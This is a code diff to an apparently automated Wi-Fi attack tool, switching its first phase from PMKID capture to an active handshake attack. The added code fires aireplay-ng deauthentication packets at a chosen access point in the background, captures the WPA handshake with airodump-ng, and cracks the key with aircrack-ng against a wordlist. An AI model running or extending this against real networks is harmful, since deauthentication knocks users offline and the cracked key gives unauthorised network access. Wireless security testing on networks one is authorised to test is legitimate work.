@@ -445,7 +445,7 @@ def auto_route(subnets: list[str]):
 
 def preflight_check():
     """Verify required system tools are installed before running any phase."""
-    tools = ["nmap", "aircrack-ng", "airodump-ng", "hcxdumptool", "airmon-ng"]
+    tools = ["nmap", "aircrack-ng", "airodump-ng", "aireplay-ng", "airmon-ng"]
     missing = []
     for tool in tools:
         rc, _ = run_cmd(f"which {tool}", capture=False)
@@ -589,26 +589,38 @@ def phase1_wifi_crack() -> PhaseResult:
                 f"[bold white]Interface :[/bold white] {iface}\n"
                 f"[bold white]Target    :[/bold white] {chosen['ssid']}  ({bssid})\n"
                 f"[bold white]Channel   :[/bold white] {channel}\n"
-                f"[bold white]Duration  :[/bold white] 20 s\n"
-                f"[bold white]Method    :[/bold white] [green]PMKID (client-less)[/green]",
-                title="[bold cyan] Capturing PMKID [/bold cyan]",
+                f"[bold white]Duration  :[/bold white] 60 s\n"
+                f"[bold white]Deauth    :[/bold white] [green]auto — firing in 3 s[/green]",
+                title="[bold cyan] Capturing Handshake [/bold cyan]",
                 border_style="cyan", expand=False,
             ))
 
-            pcapng_file = f"{cap}.pcapng"
-            run_cmd(f"sudo rm -f {pcapng_file}", capture=False)
-            run_cmd(
-                f"sudo timeout 20 hcxdumptool -i {iface} -w {pcapng_file} -c {channel}",
-                timeout=30, capture=True,
+            # Launch deauth in background; 3-second sleep lets airodump-ng
+            # initialise before the first packet is fired.
+            deauth_proc = subprocess.Popen(
+                f"sudo sh -c 'sleep 3 && aireplay-ng --deauth 20 -a {bssid} {iface}'",
+                shell=True,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
             )
+            try:
+                run_cmd(
+                    f"sudo timeout 60 airodump-ng --bssid {bssid} -c {channel} "
+                    f"-w {cap} {iface} 2>/dev/null",
+                    timeout=75, capture=False,
+                )
+            finally:
+                if deauth_proc.poll() is None:
+                    deauth_proc.terminate()
 
-            if not os.path.exists(pcapng_file):
+            cap_file = f"{cap}-01.cap"
+            if not os.path.exists(cap_file):
                 warn("No capture file created — interface may have lost monitor mode")
             else:
                 ok("Capture file found — running aircrack-ng...")
                 wl_arg = wl if wl else "/dev/null"
                 rc, out = run_cmd(
-                    f"sudo aircrack-ng {pcapng_file} -b {bssid} -w {wl_arg}", timeout=300
+                    f"sudo aircrack-ng {cap_file} -w {wl_arg}", timeout=300
                 )
                 if "KEY FOUND" in out:
                     # Strip ANSI escape sequences before parsing — aircrack-ng
@@ -655,12 +667,12 @@ def phase1_wifi_crack() -> PhaseResult:
 
             console.print()
             if not Confirm.ask(
-                "[yellow]Retry PMKID capture on this AP?[/yellow]", default=True
+                "[yellow]Retry handshake capture on this AP?[/yellow]", default=True
             ):
                 break
 
         r.status  = "failed"
-        r.finding = "PMKID not cracked — try a longer capture or bigger wordlist"
+        r.finding = "Handshake not cracked — try a longer capture or bigger wordlist"
         err(r.finding)
 
     finally:
